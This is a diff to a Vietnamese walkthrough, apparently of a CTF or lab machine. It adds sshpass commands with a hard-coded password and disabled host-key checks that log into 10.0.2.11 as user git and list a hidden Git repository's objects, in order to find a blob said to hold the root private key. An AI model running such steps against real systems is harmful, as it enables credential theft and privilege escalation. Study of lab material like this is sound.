@@ -290,6 +290,16 @@ User `git` thuộc group `git` và có quyền đọc bare Git repository ẩn t
 ```text
 /opt/.cache-loader/state
 ```
+kiểm tra repo, liệt kê tất cả các object
+```bash
+sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 \
+  'ls -la /opt/.cache-loader/state; GIT_DIR=/opt/.cache-loader/state git rev-list --objects --all'
+```
+Sau khi có danh sách object, tìm blob
+```bash
+sshpass -p 'wi3fw39w0j12e' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null git@10.0.2.11 \
+  'GIT_DIR=/opt/.cache-loader/state git cat-file --batch-check --batch-all-objects | grep blob'
+```
 
 Blob chứa private key root (ED25519) có hash:
 
